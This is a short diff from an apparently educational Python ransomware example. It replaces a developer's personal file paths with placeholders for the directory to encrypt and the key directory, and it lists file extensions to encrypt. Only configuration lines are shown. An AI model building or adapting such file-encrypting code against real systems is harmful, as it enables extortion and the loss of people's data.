@@ -4,10 +4,8 @@ import os
 from cryptography.fernet import Fernet
 import sys, getopt
 
-target_directory = (
-    "/Users/jamieskinner/Desktop/Personal/python-examples/ransomware/testing"
-)
-keys_directory = "/Users/jamieskinner/Desktop/Personal/python-examples/ransomware/keys"
+target_directory = "the/directory/you/want/to/encrypt"
+keys_directory = "the/directory/where/you/want/to/store/keys"
 key_path = os.path.join(keys_directory, "private.key")
 extensions_to_encrypt = [".txt", ".doc", ".jpg", ".jpeg", ".png"]
 
